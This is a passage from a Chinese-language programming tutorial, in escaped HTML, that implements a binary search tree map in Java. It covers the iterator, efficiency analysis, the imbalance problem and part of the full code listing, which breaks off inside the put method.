         * &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
        &lt;span&gt;private&lt;/span&gt; EntryNode&amp;lt;K,V&amp;gt;&lt;span&gt; nextNode;

        &lt;/span&gt;&lt;span&gt;private&lt;/span&gt;&lt;span&gt; Itr() {
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;:::初始化时，nextNode指向第一个节点&lt;/span&gt;
            &lt;span&gt;this&lt;/span&gt;.nextNode = TreeMap.&lt;span&gt;this&lt;/span&gt;&lt;span&gt;.getFirstNode();
        }

        @Override
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;boolean&lt;/span&gt;&lt;span&gt; hasNext() {
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (&lt;span&gt;this&lt;/span&gt;.nextNode != &lt;span&gt;null&lt;/span&gt;&lt;span&gt;);
        }

        @Override
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; Map.EntryNode&amp;lt;K, V&amp;gt;&lt;span&gt; next() {
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.currentNode = &lt;span&gt;this&lt;/span&gt;&lt;span&gt;.nextNode;

            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.nextNode = TreeMap.&lt;span&gt;this&lt;/span&gt;.getSuccessor(&lt;span&gt;this&lt;/span&gt;&lt;span&gt;.nextNode);

            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;this&lt;/span&gt;&lt;span&gt;.currentNode;
        }

        @Override
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; remove() {
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;(&lt;span&gt;this&lt;/span&gt;.currentNode == &lt;span&gt;null&lt;/span&gt;&lt;span&gt;){
                &lt;/span&gt;&lt;span&gt;throw&lt;/span&gt; &lt;span&gt;new&lt;/span&gt; IteratorStateErrorException(&quot;迭代器状态异常: 可能在一次迭代中进行了多次remove操作&quot;&lt;span&gt;);
            }

            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;:::判断当前被删除的节点是否同时存在左右孩子&lt;/span&gt;
            &lt;span&gt;if&lt;/span&gt;(&lt;span&gt;this&lt;/span&gt;.currentNode.left != &lt;span&gt;null&lt;/span&gt; &amp;amp;&amp;amp; &lt;span&gt;this&lt;/span&gt;.currentNode.right != &lt;span&gt;null&lt;/span&gt;&lt;span&gt;){
                &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt;
                    同时存在左右孩子的节点删除时当前节点会和直接后继(nextNode)进行交换
                    因此nextNode指向当前节点
                 &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
                &lt;span&gt;this&lt;/span&gt;.nextNode = &lt;span&gt;this&lt;/span&gt;&lt;span&gt;.currentNode;
            }
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;:::删除当前节点&lt;/span&gt;
            TreeMap.&lt;span&gt;this&lt;/span&gt;.deleteEntryNode(&lt;span&gt;this&lt;/span&gt;&lt;span&gt;.currentNode);

            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;:::currentNode设置为null，防止反复调用remove方法&lt;/span&gt;
            &lt;span&gt;this&lt;/span&gt;.currentNode = &lt;span&gt;null&lt;/span&gt;&lt;span&gt;;
        }
    }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;h3&gt;5.1 空间效率&lt;/h3&gt;
&lt;p&gt;　　二叉搜索树的内部节点除了key，value的引用，同时还维护着双亲，左右孩子节点的引用(不一定存在)，因此其空间效率比链表稍差，更是不如向量结构紧凑。但是这一点点空间效率的损失，带来的是二叉搜索树全面而优异的增删改查效率。&lt;/p&gt;
&lt;h3&gt;5.2 时间效率&lt;/h3&gt;
&lt;p&gt;　　二叉搜索树的插入，删除依赖于查询接口，而查询接口是以二分查找的方式实现的。在理想状态下(平衡的)，二叉搜索树的增删改查接口的效率为(O(logN))，N为当前二叉搜索树存储的元素总数；也可以说，二叉搜索树增删改查接口的效率正比于二叉搜索树的高度。&lt;/p&gt;

&lt;h3&gt;6.1 当前版本缺陷：&lt;/h3&gt;
&lt;p&gt;　　至此，我们实现了一个最基础的二叉搜索树，但还存在一个致命缺陷：&lt;/p&gt;
&lt;p&gt;　　二叉搜索树在插入数据时，以二分查找的方式确定插入的位置。但是当插入数据的数据不够随机时，会降低二叉搜索树的查询效率。举个极端例子，当按照顺序插入1到10000的元素以从小到大顺序插入，二叉搜索树将退化为一个一维的链表(&lt;strong&gt;极端不平衡&lt;/strong&gt;)，查询效率从O(logN)急剧降低为O(n)。&lt;/p&gt;
&lt;p&gt;　　我们希望在插入，删除元素时，通过及时的调整二叉搜索树结构，用一系列等价变换的操作，使二叉搜索树始终保持一个适度平衡的状态(即所有的左右子树的高度差其绝对值不超过1)。我们称这样的二叉搜索树为平衡二叉搜索树(&lt;strong&gt;B&lt;/strong&gt;alanced &lt;strong&gt;B&lt;/strong&gt;inary &lt;strong&gt;S&lt;/strong&gt;earch &lt;strong&gt;T&lt;/strong&gt;ree)，常见的平衡二叉搜索树有AVL树、红黑树等。&lt;/p&gt;
&lt;p&gt;　　只有平衡二叉搜索树才能始终保证始终高效的查询效率(O(logN))，而不会因为极端数据集合的插入，造成效率的大幅降低。&lt;/p&gt;
&lt;h3&gt;6.2 完整代码&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;二叉搜索树ADT接口:&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34.5&quot;&gt;&lt;img id=&quot;code_img_closed_c816e9cf-b020-4af1-8a5f-819b2fc24a9c&quot; class=&quot;code_img_closed&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ContractedBlock.gif&quot; alt=&quot;&quot;/&gt;&lt;img id=&quot;code_img_opened_c816e9cf-b020-4af1-8a5f-819b2fc24a9c&quot; class=&quot;code_img_opened&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ExpandedBlockStart.gif&quot; alt=&quot;&quot;/&gt;&lt;div id=&quot;cnblogs_code_open_c816e9cf-b020-4af1-8a5f-819b2fc24a9c&quot; class=&quot;cnblogs_code_hide&quot; readability=&quot;64&quot;&gt;
&lt;pre&gt;
&lt;span&gt; 1&lt;/span&gt; &lt;span&gt;/**&lt;/span&gt;
&lt;span&gt; 2&lt;/span&gt; &lt;span&gt; * Map ADT接口
&lt;/span&gt;&lt;span&gt; 3&lt;/span&gt;  &lt;span&gt;*/&lt;/span&gt;
&lt;span&gt; 4&lt;/span&gt; &lt;span&gt;public&lt;/span&gt; &lt;span&gt;interface&lt;/span&gt; Map &amp;lt;K,V&amp;gt;&lt;span&gt;{
&lt;/span&gt;&lt;span&gt; 5&lt;/span&gt;     &lt;span&gt;/**&lt;/span&gt;
&lt;span&gt; 6&lt;/span&gt; &lt;span&gt;     * 存入键值对
&lt;/span&gt;&lt;span&gt; 7&lt;/span&gt; &lt;span&gt;     * &lt;/span&gt;&lt;span&gt;@param&lt;/span&gt;&lt;span&gt; key   key值
&lt;/span&gt;&lt;span&gt; 8&lt;/span&gt; &lt;span&gt;     * &lt;/span&gt;&lt;span&gt;@param&lt;/span&gt;&lt;span&gt; value value
&lt;/span&gt;&lt;span&gt; 9&lt;/span&gt; &lt;span&gt;     * &lt;/span&gt;&lt;span&gt;@return&lt;/span&gt;&lt;span&gt; 被覆盖的的value值
&lt;/span&gt;&lt;span&gt;10&lt;/span&gt;      &lt;span&gt;*/&lt;/span&gt;
&lt;span&gt;11&lt;/span&gt; &lt;span&gt;    V put(K key,V value);
&lt;/span&gt;&lt;span&gt;12&lt;/span&gt; 
&lt;span&gt;13&lt;/span&gt;     &lt;span&gt;/**&lt;/span&gt;
&lt;span&gt;14&lt;/span&gt; &lt;span&gt;     * 移除键值对
&lt;/span&gt;&lt;span&gt;15&lt;/span&gt; &lt;span&gt;     * &lt;/span&gt;&lt;span&gt;@param&lt;/span&gt;&lt;span&gt; key   key值
&lt;/span&gt;&lt;span&gt;16&lt;/span&gt; &lt;span&gt;     * &lt;/span&gt;&lt;span&gt;@return&lt;/span&gt;&lt;span&gt; 被删除的value的值
&lt;/span&gt;&lt;span&gt;17&lt;/span&gt;      &lt;span&gt;*/&lt;/span&gt;
&lt;span&gt;18&lt;/span&gt; &lt;span&gt;    V remove(K key);
&lt;/span&gt;&lt;span&gt;19&lt;/span&gt; 
&lt;span&gt;20&lt;/span&gt;     &lt;span&gt;/**&lt;/span&gt;
&lt;span&gt;21&lt;/span&gt; &lt;span&gt;     * 获取key对应的value值
&lt;/span&gt;&lt;span&gt;22&lt;/span&gt; &lt;span&gt;     * &lt;/span&gt;&lt;span&gt;@param&lt;/span&gt;&lt;span&gt; key   key值
&lt;/span&gt;&lt;span&gt;23&lt;/span&gt; &lt;span&gt;     * &lt;/span&gt;&lt;span&gt;@return&lt;/span&gt;&lt;span&gt;      对应的value值
&lt;/span&gt;&lt;span&gt;24&lt;/span&gt;      &lt;span&gt;*/&lt;/span&gt;
&lt;span&gt;25&lt;/span&gt; &lt;span&gt;    V get(K key);
&lt;/span&gt;&lt;span&gt;26&lt;/span&gt; 
&lt;span&gt;27&lt;/span&gt;     &lt;span&gt;/**&lt;/span&gt;
&lt;span&gt;28&lt;/span&gt; &lt;span&gt;     * 是否包含当前key值
&lt;/span&gt;&lt;span&gt;29&lt;/span&gt; &lt;span&gt;     * &lt;/span&gt;&lt;span&gt;@param&lt;/span&gt;&lt;span&gt; key   key值
&lt;/span&gt;&lt;span&gt;30&lt;/span&gt; &lt;span&gt;     * &lt;/span&gt;&lt;span&gt;@return&lt;/span&gt;&lt;span&gt;      true：包含 false：不包含
&lt;/span&gt;&lt;span&gt;31&lt;/span&gt;      &lt;span&gt;*/&lt;/span&gt;
&lt;span&gt;32&lt;/span&gt;     &lt;span&gt;boolean&lt;/span&gt;&lt;span&gt; containsKey(K key);
&lt;/span&gt;&lt;span&gt;33&lt;/span&gt; 
&lt;span&gt;34&lt;/span&gt;     &lt;span&gt;/**&lt;/span&gt;
&lt;span&gt;35&lt;/span&gt; &lt;span&gt;     * 是否包含当前value值
&lt;/span&gt;&lt;span&gt;36&lt;/span&gt; &lt;span&gt;     * &lt;/span&gt;&lt;span&gt;@param&lt;/span&gt;&lt;span&gt; value   value值
&lt;/span&gt;&lt;span&gt;37&lt;/span&gt; &lt;span&gt;     * &lt;/span&gt;&lt;span&gt;@return&lt;/span&gt;&lt;span&gt;        true：包含 false：不包含
&lt;/span&gt;&lt;span&gt;38&lt;/span&gt;      &lt;span&gt;*/&lt;/span&gt;
&lt;span&gt;39&lt;/span&gt;     &lt;span&gt;boolean&lt;/span&gt;&lt;span&gt; containsValue(V value);
&lt;/span&gt;&lt;span&gt;40&lt;/span&gt; 
&lt;span&gt;41&lt;/span&gt;     &lt;span&gt;/**&lt;/span&gt;
&lt;span&gt;42&lt;/span&gt; &lt;span&gt;     * 获得当前map存储的键值对数量
&lt;/span&gt;&lt;span&gt;43&lt;/span&gt; &lt;span&gt;     * &lt;/span&gt;&lt;span&gt;@return&lt;/span&gt;&lt;span&gt; 键值对数量
&lt;/span&gt;&lt;span&gt;44&lt;/span&gt; &lt;span&gt;     * &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
&lt;span&gt;45&lt;/span&gt;     &lt;span&gt;int&lt;/span&gt;&lt;span&gt; size();
&lt;/span&gt;&lt;span&gt;46&lt;/span&gt; 
&lt;span&gt;47&lt;/span&gt;     &lt;span&gt;/**&lt;/span&gt;
&lt;span&gt;48&lt;/span&gt; &lt;span&gt;     * 当前map是否为空
&lt;/span&gt;&lt;span&gt;49&lt;/span&gt; &lt;span&gt;     * &lt;/span&gt;&lt;span&gt;@return&lt;/span&gt;&lt;span&gt;  true：为空 false：不为空
&lt;/span&gt;&lt;span&gt;50&lt;/span&gt;      &lt;span&gt;*/&lt;/span&gt;
&lt;span&gt;51&lt;/span&gt;     &lt;span&gt;boolean&lt;/span&gt;&lt;span&gt; isEmpty();
&lt;/span&gt;&lt;span&gt;52&lt;/span&gt; 
&lt;span&gt;53&lt;/span&gt;     &lt;span&gt;/**&lt;/span&gt;
&lt;span&gt;54&lt;/span&gt; &lt;span&gt;     * 清空当前map
&lt;/span&gt;&lt;span&gt;55&lt;/span&gt;      &lt;span&gt;*/&lt;/span&gt;
&lt;span&gt;56&lt;/span&gt;     &lt;span&gt;void&lt;/span&gt;&lt;span&gt; clear();
&lt;/span&gt;&lt;span&gt;57&lt;/span&gt; 
&lt;span&gt;58&lt;/span&gt;     &lt;span&gt;/**&lt;/span&gt;
&lt;span&gt;59&lt;/span&gt; &lt;span&gt;     * 获得迭代器
&lt;/span&gt;&lt;span&gt;60&lt;/span&gt; &lt;span&gt;     * &lt;/span&gt;&lt;span&gt;@return&lt;/span&gt;&lt;span&gt; 迭代器对象
&lt;/span&gt;&lt;span&gt;61&lt;/span&gt;      &lt;span&gt;*/&lt;/span&gt;
&lt;span&gt;62&lt;/span&gt;     Iterator&amp;lt;EntryNode&amp;lt;K,V&amp;gt;&amp;gt;&lt;span&gt; iterator();
&lt;/span&gt;&lt;span&gt;63&lt;/span&gt; 
&lt;span&gt;64&lt;/span&gt;     &lt;span&gt;/**&lt;/span&gt;
&lt;span&gt;65&lt;/span&gt; &lt;span&gt;     * entry 键值对节点接口
&lt;/span&gt;&lt;span&gt;66&lt;/span&gt; &lt;span&gt;     * &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
&lt;span&gt;67&lt;/span&gt;     &lt;span&gt;interface&lt;/span&gt; EntryNode&amp;lt;K,V&amp;gt;&lt;span&gt;{
&lt;/span&gt;&lt;span&gt;68&lt;/span&gt;         &lt;span&gt;/**&lt;/span&gt;
&lt;span&gt;69&lt;/span&gt; &lt;span&gt;         * 获得key值
&lt;/span&gt;&lt;span&gt;70&lt;/span&gt; &lt;span&gt;         * &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
&lt;span&gt;71&lt;/span&gt; &lt;span&gt;        K getKey();
&lt;/span&gt;&lt;span&gt;72&lt;/span&gt; 
&lt;span&gt;73&lt;/span&gt;         &lt;span&gt;/**&lt;/span&gt;
&lt;span&gt;74&lt;/span&gt; &lt;span&gt;         * 获得value值
&lt;/span&gt;&lt;span&gt;75&lt;/span&gt; &lt;span&gt;         * &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
&lt;span&gt;76&lt;/span&gt; &lt;span&gt;        V getValue();
&lt;/span&gt;&lt;span&gt;77&lt;/span&gt; 
&lt;span&gt;78&lt;/span&gt;         &lt;span&gt;/**&lt;/span&gt;
&lt;span&gt;79&lt;/span&gt; &lt;span&gt;         * 设置value值
&lt;/span&gt;&lt;span&gt;80&lt;/span&gt; &lt;span&gt;         * &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
&lt;span&gt;81&lt;/span&gt;         &lt;span&gt;void&lt;/span&gt;&lt;span&gt; setValue(V value);
&lt;/span&gt;&lt;span&gt;82&lt;/span&gt; &lt;span&gt;    }
&lt;/span&gt;&lt;span&gt;83&lt;/span&gt; }
&lt;/pre&gt;&lt;/div&gt;
&lt;span class=&quot;cnblogs_code_collapse&quot;&gt;View Code&lt;/span&gt;&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;二叉搜索树实现:&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;67.5&quot;&gt;&lt;img id=&quot;code_img_closed_adf60329-cac7-44e0-868e-80f4e0fd1ea2&quot; class=&quot;code_img_closed&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ContractedBlock.gif&quot; alt=&quot;&quot;/&gt;&lt;img id=&quot;code_img_opened_adf60329-cac7-44e0-868e-80f4e0fd1ea2&quot; class=&quot;code_img_opened&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ExpandedBlockStart.gif&quot; alt=&quot;&quot;/&gt;&lt;div id=&quot;cnblogs_code_open_adf60329-cac7-44e0-868e-80f4e0fd1ea2&quot; class=&quot;cnblogs_code_hide&quot; readability=&quot;130&quot;&gt;
&lt;pre&gt;
&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
 * 二叉搜索树实现
 &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt; TreeMap&amp;lt;K,V&amp;gt; &lt;span&gt;implements&lt;/span&gt; Map&amp;lt;K,V&amp;gt;&lt;span&gt;{

    &lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
     * 根节点
     * &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
    &lt;span&gt;private&lt;/span&gt; EntryNode&amp;lt;K,V&amp;gt;&lt;span&gt; root;

    &lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
     * 比较器(初始化之后，不能改)
     * &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
    &lt;span&gt;private&lt;/span&gt; &lt;span&gt;final&lt;/span&gt; Comparator&amp;lt;? &lt;span&gt;super&lt;/span&gt; K&amp;gt;&lt;span&gt; comparator;

    &lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
     * 当前二叉树的大小
     * &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
    &lt;span&gt;private&lt;/span&gt; &lt;span&gt;int&lt;/span&gt;&lt;span&gt; size;

    &lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
     * 默认构造函数
     * &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
    &lt;span&gt;public&lt;/span&gt;&lt;span&gt; TreeMap() {
        &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.comparator = &lt;span&gt;null&lt;/span&gt;&lt;span&gt;;
    }

    &lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
     * 指定了比较器的构造函数
     * &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
    &lt;span&gt;public&lt;/span&gt; TreeMap(Comparator&amp;lt;? &lt;span&gt;super&lt;/span&gt; K&amp;gt;&lt;span&gt; comparator) {
        &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.comparator =&lt;span&gt; comparator;
    }

    &lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
     * target 和目标节点的相对位置
     * &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
    &lt;span&gt;private&lt;/span&gt; &lt;span&gt;enum&lt;/span&gt;&lt;span&gt; RelativePosition {
        &lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
         * 左节点
         * &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
        LEFT,

        &lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
         * 右节点
         * &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
        RIGHT,

        &lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
         * 当前节点
         * &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
        CURRENT;
    }

    &lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
     * 二叉搜索树 内部节点
     * &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
    &lt;span&gt;static&lt;/span&gt; &lt;span&gt;class&lt;/span&gt; EntryNode&amp;lt;K,V&amp;gt; &lt;span&gt;implements&lt;/span&gt; Map.EntryNode&amp;lt;K,V&amp;gt;&lt;span&gt;{
        &lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
         * key值
         * &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
        K key;

        &lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
         * value值
         * &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
        V value;

        &lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
         * 左孩子节点
         * &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
        EntryNode&lt;/span&gt;&amp;lt;K,V&amp;gt;&lt;span&gt; left;

        &lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
         * 右孩子节点
         * &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
        EntryNode&lt;/span&gt;&amp;lt;K,V&amp;gt;&lt;span&gt; right;

        &lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
         * 双亲节点
         * &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
        EntryNode&lt;/span&gt;&amp;lt;K,V&amp;gt;&lt;span&gt; parent;

        EntryNode(K key, V value) {
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.key =&lt;span&gt; key;
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.value =&lt;span&gt; value;
        }

        EntryNode(K key, V value,EntryNode&lt;/span&gt;&amp;lt;K,V&amp;gt;&lt;span&gt; parent) {
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.key =&lt;span&gt; key;
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.value =&lt;span&gt; value;
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.parent =&lt;span&gt; parent;
        }

        @Override
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; K getKey() {
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; key;
        }

        @Override
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; V getValue() {
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; value;
        }

        @Override
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; setValue(V value) {
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.value =&lt;span&gt; value;
        }

        @Override
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; String toString() {
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; key + &quot;=&quot; +&lt;span&gt; value;
        }
    }

    &lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
     * 二叉搜索树 迭代器实现
     * &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
    &lt;span&gt;private&lt;/span&gt; &lt;span&gt;class&lt;/span&gt; Itr &lt;span&gt;implements&lt;/span&gt; Iterator&amp;lt;Map.EntryNode&amp;lt;K,V&amp;gt;&amp;gt;&lt;span&gt;{
        &lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
         * 当前迭代节点
         * &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
        &lt;span&gt;private&lt;/span&gt; EntryNode&amp;lt;K,V&amp;gt;&lt;span&gt; currentNode;

        &lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
         * 下一个节点
         * &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
        &lt;span&gt;private&lt;/span&gt; EntryNode&amp;lt;K,V&amp;gt;&lt;span&gt; nextNode;

        &lt;/span&gt;&lt;span&gt;private&lt;/span&gt;&lt;span&gt; Itr() {
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;:::初始化时，nextNode指向第一个节点&lt;/span&gt;
            &lt;span&gt;this&lt;/span&gt;.nextNode = TreeMap.&lt;span&gt;this&lt;/span&gt;&lt;span&gt;.getFirstNode();
        }

        @Override
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;boolean&lt;/span&gt;&lt;span&gt; hasNext() {
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (&lt;span&gt;this&lt;/span&gt;.nextNode != &lt;span&gt;null&lt;/span&gt;&lt;span&gt;);
        }

        @Override
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; Map.EntryNode&amp;lt;K, V&amp;gt;&lt;span&gt; next() {
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.currentNode = &lt;span&gt;this&lt;/span&gt;&lt;span&gt;.nextNode;

            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.nextNode = TreeMap.&lt;span&gt;this&lt;/span&gt;.getSuccessor(&lt;span&gt;this&lt;/span&gt;&lt;span&gt;.nextNode);

            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;this&lt;/span&gt;&lt;span&gt;.currentNode;
        }

        @Override
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; remove() {
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;(&lt;span&gt;this&lt;/span&gt;.currentNode == &lt;span&gt;null&lt;/span&gt;&lt;span&gt;){
                &lt;/span&gt;&lt;span&gt;throw&lt;/span&gt; &lt;span&gt;new&lt;/span&gt; IteratorStateErrorException(&quot;迭代器状态异常: 可能在一次迭代中进行了多次remove操作&quot;&lt;span&gt;);
            }

            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;:::判断当前被删除的节点是否同时存在左右孩子&lt;/span&gt;
            &lt;span&gt;if&lt;/span&gt;(&lt;span&gt;this&lt;/span&gt;.currentNode.left != &lt;span&gt;null&lt;/span&gt; &amp;amp;&amp;amp; &lt;span&gt;this&lt;/span&gt;.currentNode.right != &lt;span&gt;null&lt;/span&gt;&lt;span&gt;){
                &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt;
                    同时存在左右孩子的节点删除时会和直接后继(nextNode)进行交换
                    因此nextNode指向当前节点
                 &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
                &lt;span&gt;this&lt;/span&gt;.nextNode = &lt;span&gt;this&lt;/span&gt;&lt;span&gt;.currentNode;
            }
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;:::删除当前节点&lt;/span&gt;
            TreeMap.&lt;span&gt;this&lt;/span&gt;.deleteEntryNode(&lt;span&gt;this&lt;/span&gt;&lt;span&gt;.currentNode);

            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;:::currentNode设置为null，防止反复调用remove方法&lt;/span&gt;
            &lt;span&gt;this&lt;/span&gt;.currentNode = &lt;span&gt;null&lt;/span&gt;&lt;span&gt;;
        }
    }

    &lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
     * 查找目标节点 返回值
     * &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
    &lt;span&gt;private&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;class&lt;/span&gt; TargetEntryNode&amp;lt;K,V&amp;gt;&lt;span&gt;{
        &lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
         * 目标节点
         * &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
        &lt;span&gt;private&lt;/span&gt; EntryNode&amp;lt;K,V&amp;gt;&lt;span&gt; target;

        &lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
         * 目标节点的双亲节点
         * &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
        &lt;span&gt;private&lt;/span&gt; EntryNode&amp;lt;K,V&amp;gt;&lt;span&gt; parent;

        &lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
         * 相对位置
         * &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
        &lt;span&gt;private&lt;/span&gt;&lt;span&gt; RelativePosition relativePosition;

        TargetEntryNode(EntryNode&lt;/span&gt;&amp;lt;K, V&amp;gt; target, EntryNode&amp;lt;K, V&amp;gt;&lt;span&gt; parent, RelativePosition relativePosition) {
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.target =&lt;span&gt; target;
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.parent =&lt;span&gt; parent;
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.relativePosition =&lt;span&gt; relativePosition;
        }
    }

    @Override
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; V put(K key, V value) {
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;(&lt;span&gt;this&lt;/span&gt;.root == &lt;span&gt;null&lt;/span&gt;&lt;span&gt;){
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.root = &lt;span&gt;new&lt;/span&gt; EntryNode&amp;lt;&amp;gt;&lt;span&gt;(key,value);
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.size++&lt;span&gt;;
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;null&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;:::获得目标节点&lt;/span&gt;
        TargetEntryNode&amp;lt;K,V&amp;gt; targetEntryNode =&lt;span&gt; getTargetEntryNode(key);
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;(targetEntryNode.relativePosition ==&lt;span&gt; RelativePosition.CURRENT){
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;:::目标节点存在于当前容器

            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;:::暂存之前的value&lt;/span&gt;
            V oldValue =&lt;span&gt; targetEntryNode.target.value;
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;:::替换为新的value&lt;/span&gt;
            targetEntryNode.target.value =&lt;span&gt; value;
